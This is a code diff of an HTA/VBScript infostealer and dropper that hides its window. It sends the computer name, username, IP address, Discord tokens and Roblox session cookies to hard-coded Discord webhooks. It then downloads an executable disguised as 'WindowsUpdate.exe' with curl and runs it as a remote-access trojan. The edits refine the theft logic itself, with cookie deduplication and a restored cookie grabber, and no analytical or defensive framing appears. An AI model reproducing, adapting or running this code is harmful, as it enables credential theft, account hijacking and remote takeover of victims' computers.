@@ -6,7 +6,7 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, RE_WH, PC, USER, ratDropped, globalCookie
+Dim sh, fso, WH, RE_WH, PC, USER, ratDropped, lastCookie
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -16,7 +16,7 @@ RE_WH = "https://discord.com/api/webhooks/1573947886775963800/UfMWoHoVFLXsPx1m4f
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 ratDropped = False
-globalCookie = ""
+lastCookie = ""
 
 ' --- 1. INITIAL GRABS (to C2 WH) ---
 Call PostEmbedTo(":satellite: Target", "PC: " & PC & vbCrLf & "User: " & USER, 10181046, WH)
@@ -34,13 +34,11 @@ runCount = 0
 Do
     runCount = runCount + 1
     Call PostEmbedTo(":repeat: Re Grab " & runCount, "PC: " & PC, 10181046, RE_WH)
+    
+    ' Grabs to RE_WH
     Call GrabTokens(RE_WH)
     Call IP(RE_WH)
-    
-    ' Sends cookie to RE_WH
     Call PostCookieOnly(RE_WH)
-    ' Sends cookie to WH
-    Call PostCookieOnly(WH)
     
     ' Only download RAT if it hasn't dropped successfully yet
     If Not ratDropped Then
@@ -54,35 +52,24 @@ window.close()
 
 ' --- RAT DROP (Standard Download to Disk + Execute) ---
 Sub DropRAT(targetWH, sendRocket)
-    ' Updated RAT Link
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1351499996263878729/1573919433020412246/WindowsUpdate.exe?ex=6b03c232&is=6b0270b2&hm=4d3a346fca9a87136a99e8c7c10fb28b71f0366d22cbd745c2b665e1fe3093c4&"
-    
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
     Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
     Dim op : op = tPath & "\" & fname
-
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    ' Download via curl.exe
     Dim dlCmd : dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & op & """ """ & dl & """"
     sh.Run dlCmd, 0, True
 
-    ' Check file and execute
     If fso.FileExists(op) Then
         Dim fSize : fSize = fso.GetFile(op).Size
         If fSize > 100000 Then
             Dim fSizeMB : fSizeMB = Round(fSize / 1048576, 2)
-            
             If sendRocket Then Call PostEmbedTo(":rocket: RAT Download", "Downloading: " & fSizeMB & " MB", 10181046, targetWH)
-            
-            ' Execute via WMI
             Call RunCmd("""" & op & """")
-            
-            ' Set flag to True so it stops downloading in the loop
             ratDropped = True
-            
             If sendRocket Then 
                 Call SleepSeconds(2)
                 Call PostEmbedTo(":white_check_mark: RAT Launched", "Payload executed successfully.", 10181046, targetWH)
@@ -121,12 +108,13 @@ Sub IP(targetWH)
     Set xh = Nothing
 End Sub
 
-' --- PostCookieOnly ---
+' --- PostCookieOnly (Backup) ---
 Sub PostCookieOnly(targetWH)
-    Dim cookie : cookie = globalCookie
-    If Len(cookie) = 0 Then cookie = GetRobloxCookie()
+    Dim cookie : cookie = GetRobloxCookie()
     If Len(cookie) = 0 Then Exit Sub
-    Call PostEmbedTo("Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
+    If cookie = lastCookie Then Exit Sub
+    lastCookie = cookie
+    Call PostEmbedTo(":cookie: Roblox Cookie", "Size: " & Len(cookie) & " | PC: " & PC & vbCrLf & vbCrLf & "``" & cookie & "``", 10181046, targetWH)
 End Sub
 
 ' --- GetRobloxCookie ---
@@ -251,11 +239,10 @@ Sub GrabTokens(targetWH)
                         Call PostEmbedTo(":gift: Discord Token", info, 10181046, targetWH)
                     End If
                 End If
-                ' REMOVED THE UGLY ROBLOX PARSER HERE
-                ' If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
-                '    Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, targetWH)
-                '    globalCookie = Mid(l, 8)
-                ' End If
+                ' This is the original cookie grabber logic
+                If Left(l, 7) = "ROBLOX|" Or Left(l, 9) = "ROBLOXMS|" Then
+                    Call PostEmbedTo(":cookie: Roblox Cookie", Mid(l, 8), 10181046, targetWH)
+                End If
             End If
         Next
     End If
